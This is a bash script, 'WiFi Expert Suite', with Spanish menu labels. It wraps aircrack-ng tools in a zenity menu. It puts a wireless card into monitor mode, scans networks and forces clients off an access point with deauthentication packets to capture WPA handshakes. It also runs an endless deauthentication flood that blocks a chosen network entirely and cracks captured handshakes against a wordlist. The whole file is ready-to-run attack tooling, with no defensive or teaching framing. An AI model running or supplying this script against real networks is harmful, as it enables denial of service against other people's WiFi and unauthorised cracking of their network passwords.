#!/bin/bash
# WiFi Expert Suite v7.5 - AUTOMATIC & STABLE

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite ULTIMATE" \
        --column="ID" --column="Acción" --width=600 --height=550 \
        1 "⚡ Activar Modo Monitor (Check Kill)" \
        2 "🌐 Desactivar Modo Monitor" \
        3 "📡 Escaneo General" \
        4 "🔍 Rastreo Específico" \
        5 "🔑 Capturar Handshake" \
        6 "🔥 ATAQUE PERMANENTE (Bloqueo Total)" \
        7 "🔓 DESCIFRADO AUTOMÁTICO (Un clic)" \
        8 "❌ Salir")

    case $CHOICE in
        1) 
            # Limpiamos procesos que bloquean la antena
            pkexec airmon-ng check kill
            INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
            pkexec airmon-ng start $INT | zenity --text-info --width=400 --height=200
            ;;
        2)
            pkexec airmon-ng stop wlan0mon && pkexec systemctl restart NetworkManager
            notify-send "WiFi Suite" "Internet Restaurado"
            ;;
        3)
            gnome-terminal --title="ESCANEO" -- sh -c "sudo airodump-ng wlan0mon; exec bash"
            ;;
        4)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="RASTREO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
            ;;
        5)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            FICHERO=$(zenity --entry --text="Nombre de captura:" --entry-text="captura_$(date +%H%M)")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="CAPTURANDO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL -w $FICHERO wlan0mon; exec bash" &
            sleep 3
            xterm -e "sudo aireplay-ng -0 15 -a $BSSID wlan0mon"
            ;;
        6)
            BSSID=$(zenity --entry --text="BSSID a Bloquear:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
            ATAQUE_PID=$!
            
            # Barra de progreso para control visual
            ( while ps -p $ATAQUE_PID > /dev/null; do echo "100" ; echo "# 🔥 BLOQUEANDO: $BSSID" ; sleep 2; done ) | zenity --progress --title="ATAQUE EN CURSO" --auto-close
            
            # Validación para evitar el error de proceso no encontrado
            if [ -n "$ATAQUE_PID" ] && ps -p $ATAQUE_PID > /dev/null; then
                sudo kill $ATAQUE_PID 2>/dev/null
            fi
            ;;
        7)
            # --- FUNCIÓN AUTOMÁTICA ---
            # Selecciona el archivo .cap más reciente en la carpeta actual
            CAP_REC=$(ls -t *.cap 2>/dev/null | head -n 1)
            
            if [ -z "$CAP_REC" ]; then
                zenity --error --text="No se encontró ninguna captura (.cap). Primero realiza una captura (Opción 5)."
            else
                # Busca wordlist.txt en la misma carpeta
                if [ -f "wordlist.txt" ]; then
                    notify-send "Crackeo Automático" "Procesando captura: $CAP_REC"
                    gnome-terminal --title="AUTO-CRACKING" -- sh -c "aircrack-ng -w wordlist.txt $CAP_REC; echo 'Presiona Enter para finalizar'; read"
                else
                    zenity --warning --text="No se encontró 'wordlist.txt'. Selecciónalo manualmente."
                    DICC=$(zenity --file-selection --title="Selecciona Diccionario")
                    gnome-terminal --title="DESCIFRANDO" -- sh -c "aircrack-ng -w $DICC $CAP_REC; read"
                fi
            fi
            ;;
        8) exit ;;
    esac
done
